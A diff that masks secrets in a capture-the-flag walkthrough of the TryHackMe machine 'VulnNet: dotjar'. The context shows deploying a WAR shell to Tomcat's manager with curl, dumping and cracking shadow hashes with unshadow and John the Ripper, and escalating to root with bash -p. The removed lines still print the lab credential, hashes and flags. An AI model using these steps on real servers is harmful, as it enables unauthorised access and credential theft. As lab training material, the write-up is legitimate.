@@ -124,7 +124,7 @@ Getting resource at ajp13://dotjar.thm:8009/asdf
 -- Your project scope is written in the contract.
 3. Developer access is granted with the credentials provided below:
  
-    webdev:Hgj3LA$02D$Fa@21
+    webdev:<HIDDEN>
  
 GUI access is disabled for security reasons.
  
@@ -160,7 +160,7 @@ Another Google found [this](https://gist.github.com/pete911/6111816) which shows
 
 ```text
 ┌──(root💀kali)-[~/thm/dotjar]
-└─# curl --upload-file pencer-shell.war -u webdev:'Hgj3LA$02D$Fa@21' 'http://dotjar.thm:8080/manager/text/deploy?path=/' 
+└─# curl --upload-file pencer-shell.war -u webdev:'<HIDDEN>' 'http://dotjar.thm:8080/manager/text/deploy?path=/' 
 OK - Deployed application at context path [/pencer-shell.war]
 ```
 
@@ -262,10 +262,9 @@ web@vulnnet-dotjar:/dev/shm$ file shadow-backup-alt
 shadow-backup-alt: ASCII text
 
 web@vulnnet-dotjar:/dev/shm$ cat shadow-backup-alt 
-root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:18643:0:99999:7:::
-<SNIP
-jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:18643:0:99999:7:::
-web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:18643:0:99999:7:::
+root:<HIDDEN>:18643:0:99999:7:::
+jdk-admin:<HIDDEN>:18643:0:99999:7:::
+web:<HIDDEN>:18643:0:99999:7:::
 ```
 
 We have a copy of the shadow file containing the hashes of the users passwords. We can use unshadow to combine it with the /etc/passwd file:
@@ -277,10 +276,9 @@ Usage: unshadow PASSWORD-FILE SHADOW-FILE
 
 ┌──(root💀kali)-[~/thm/dotjar]
 └─# unshadow passwd.txt shadow.txt 
-root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/
-<SNIP>
-jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:1000:1000:jdk-admin,,,:/home/jdk-admin:/bin/bash
-web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:1001:1001:,,,:/home/web:/bin/bash
+root:<HIDDEN>
+jdk-admin:<HIDDEN>:1000:1000:jdk-admin,,,:/home/jdk-admin:/bin/bash
+web:<HIDDEN>:1001:1001:,,,:/home/web:/bin/bash
 ```
 
 We can save these hashes to a file then use JohnTheRipper to try and crack them:
@@ -293,7 +291,7 @@ Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-794613852        (jdk-admin)
+<HIDDEN>       (jdk-admin)
 1g 0:00:00:00 DONE (2021-04-29 21:51) 9.090g/s 2327p/s 2327c/s 2327C/s i<3ruby..diana
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
@@ -308,7 +306,7 @@ web@vulnnet-dotjar:/dev/shm$ su jdk-admin
 Password: 
 
 jdk-admin@vulnnet-dotjar:/dev/shm$ cat /home/jdk-admin/user.txt 
-THM{1ae87fa6ec2cd9f840c68cbad78e9351}
+THM{<HIDDEN>}
 ```
 
 One of the first things I check after a getting access to a new user is sudo rights:
@@ -371,7 +369,7 @@ Finally we run bash and escalate to root to get the last flag:
 ```text
 jdk-admin@vulnnet-dotjar:/dev/shm$ bash -p
 bash-4.4# cat /root/root.txt
-THM{464c29e3ffae05c2e67e6f0c5064759c}
+THM{<HUDDEN>}
 ```
 
 All done. See you next time.
